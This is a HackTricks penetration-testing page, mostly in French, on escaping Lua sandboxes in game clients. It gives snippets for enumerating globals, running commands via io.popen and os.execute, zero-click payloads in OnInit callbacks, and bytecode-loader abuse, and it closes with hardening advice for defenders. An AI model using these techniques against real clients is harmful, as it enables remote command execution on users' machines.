# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Cette page rassemble des techniques pratiques pour énumérer et s'échapper des sandboxes Lua intégrées dans des applications (notamment les game clients, plugins, or in-app scripting engines). De nombreux moteurs exposent un environnement Lua restreint, mais laissent des globals puissants accessibles qui permettent l'exécution arbitraire de commandes ou même une corruption mémoire native lorsque des bytecode loaders sont exposés.

Idées clés :
- Considérez la VM comme un environnement inconnu : énumérez _G et découvrez quelles primitives dangereuses sont accessibles.
- Quand stdout/print est bloqué, utilisez tout canal UI/IPC in-VM comme canal de sortie pour observer les résultats.
- Si io/os est exposé, vous avez souvent une exécution directe de commandes (io.popen, os.execute).
- Si load/loadstring/loadfile sont exposés, l'exécution de Lua bytecode crafté peut compromettre la sécurité mémoire dans certaines versions (≤5.1 verifiers are bypassable; 5.2 removed verifier), permettant une exploitation avancée.

## Enumerate the sandboxed environment

- Exporter l'environnement global pour recenser les tables/fonctions accessibles:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si print() n'est pas disponible, réaffectez les in-VM channels. Exemple tiré d'un MMO housing script VM où la sortie chat ne fonctionne qu'après un appel sonore ; ce qui suit construit une fonction de sortie fiable :
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Généralisez ce modèle pour votre cible : tout champ de texte, toast, logger ou callback UI acceptant des chaînes peut servir de stdout pour la reconnaissance.

## Exécution directe de commandes si io/os est exposé

Si la sandbox expose encore les bibliothèques standard io ou os, vous avez probablement une exécution de commandes immédiate :
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Remarques :
- L'exécution se déroule à l'intérieur du processus client ; de nombreuses couches anti-cheat/antidebug qui bloquent les debuggers externes n'empêcheront pas la création de processus in-VM.
- Vérifier aussi : package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Tout callback équivalent (OnLoad, OnEnter, etc.) généralise cette technique lorsque les scripts sont transmis et exécutés automatiquement sur le client.

## Primitives dangereuses à rechercher pendant la recon

Lors de l'énumération de _G, recherchez spécifiquement :
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: exécuter du source ou du bytecode ; permet de charger du bytecode non fiable.
- package, package.loadlib, require: chargement dynamique de bibliothèques et surface des modules.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, et hooks.
- LuaJIT-only: ffi.cdef, ffi.load pour appeler du code natif directement.

Exemples d'utilisation minimaux (si accessibles) :
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalade optionnelle : abusing Lua bytecode loaders

Lorsque load/loadstring/loadfile sont accessibles mais que io/os sont restreints, l'exécution de bytecode Lua spécialement conçu peut conduire à des primitives de divulgation mémoire et de corruption. Faits clés :
- Lua ≤ 5.1 incluait un bytecode verifier qui possède des contournements connus.
- Lua 5.2 a supprimé le verifier entièrement (position officielle : les applications devraient simplement rejeter les chunks précompilés), élargissant la surface d'attaque si le chargement de bytecode n'est pas prohibé.
- Workflows typiques : leak de pointeurs via sortie in-VM, création de bytecode pour provoquer des confusions de type (par ex. autour de FORLOOP ou d'autres opcodes), puis pivot vers read/write arbitraire ou exécution de code natif.

Cette voie est spécifique à l'engine/version et nécessite RE. Voir les références pour des deep dives, primitives d'exploitation et exemples de gadgetry dans les jeux.

## Detection and hardening notes (for defenders)

- Server side : rejeter ou réécrire les user scripts ; allowlist les APIs sûres ; strip ou bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side : exécuter Lua avec un _ENV minimal, interdire le chargement de bytecode, réintroduire un strict bytecode verifier ou des vérifications de signature, et bloquer la création de processus depuis le client process.
- Telemetry : alerter sur gameclient → child process creation peu après le chargement d'un script ; corréler avec événements UI/chat/script.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
